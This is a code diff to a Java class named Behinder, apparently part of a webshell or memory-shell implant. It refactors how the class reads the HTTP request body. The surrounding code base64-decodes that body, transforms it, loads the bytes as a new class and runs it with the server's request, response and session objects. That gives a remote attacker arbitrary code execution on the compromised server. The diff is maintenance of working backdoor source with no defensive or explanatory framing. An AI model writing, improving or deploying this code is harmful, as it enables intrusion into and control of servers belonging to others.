@@ -44,9 +44,7 @@ public class Behinder extends ClassLoader {
                 map.put("request", request);
                 map.put("response", getInternalResponse(response));
                 map.put("session", session);
-                Method getReader = request.getClass().getDeclaredMethod("getReader");
-                getReader.setAccessible(true);
-                String parameter = ((BufferedReader) getReader.invoke(request)).readLine();
+                String parameter = ((BufferedReader) invokeMethod(request, "getReader")).readLine();
                 byte[] bytes = x(base64Decode(parameter));
                 Object instance = (new Behinder(this.getClass().getClassLoader())).g(bytes).newInstance();
                 instance.equals(map);
@@ -121,5 +119,28 @@ public class Behinder extends ClassLoader {
             }
         }
         return value;
+    }
+
+    @SuppressWarnings("all")
+    public static Object invokeMethod(Object obj, String methodName) {
+        try {
+            Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
+            Method method = null;
+            while (clazz != null && method == null) {
+                try {
+                    method = clazz.getMethod(methodName);
+                } catch (NoSuchMethodException e) {
+                    clazz = clazz.getSuperclass();
+                }
+            }
+            if (method == null) {
+                throw new NoSuchMethodException("Method not found: " + methodName);
+            }
+
+            method.setAccessible(true);
+            return method.invoke(obj instanceof Class ? null : obj);
+        } catch (Exception e) {
+            throw new RuntimeException("Error invoking method: " + methodName, e);
+        }
     }
 }
